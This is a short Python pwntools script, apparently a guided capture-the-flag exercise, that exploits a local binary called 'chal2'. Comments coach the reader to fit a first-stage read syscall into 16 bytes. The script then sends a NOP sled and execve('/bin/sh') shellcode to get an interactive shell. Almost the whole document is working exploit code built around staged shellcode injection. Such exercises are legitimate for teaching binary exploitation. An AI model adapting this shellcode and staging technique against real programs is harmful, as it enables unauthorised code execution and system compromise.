from pwn import *

p = process("./chal2")
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# For this challenge, your task is removing redundant shellcodes and make it less than 0x10 bytes
# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check the registers!
# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") because "/bin/sh" takes 8 bytes. \
# And why don't we call read rather than execve \
# so we could read longer shellcode and execute "/bin/sh" 
context.arch = 'amd64'
shellcode = f'''
mov rdx,0x100
syscall
'''
# gdb.attach(p)
shellcode = asm(shellcode)
print(len(shellcode))
assert(len(shellcode)<=0x10)
p.send(shellcode.ljust(0x10,b'\0'))
# If you sent proper shellcode which allow us to read longer shellcode, 
# you can try the following code it's a more beatiful way to generate shellcode
p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))
p.interactive()